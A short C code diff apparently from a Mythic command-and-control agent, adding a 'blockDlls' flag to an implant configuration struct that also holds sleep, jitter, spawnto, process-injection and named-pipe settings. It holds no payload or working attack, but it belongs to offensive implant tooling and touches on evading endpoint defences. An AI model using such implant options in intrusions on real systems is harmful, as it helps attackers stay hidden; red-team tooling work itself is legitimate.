@@ -45,7 +45,8 @@ typedef struct
     UINT32 sleeptime;
     UINT32 jitter;
     // Injection Options
-    PCHAR spawnto;  
+    PCHAR spawnto;
+    BOOL  blockDlls;
     CHAR injectKitSpawn[37];               // Mythic UUIDs for BOF files
     CHAR injectKitExplicit[37];
     PCHAR pipename;
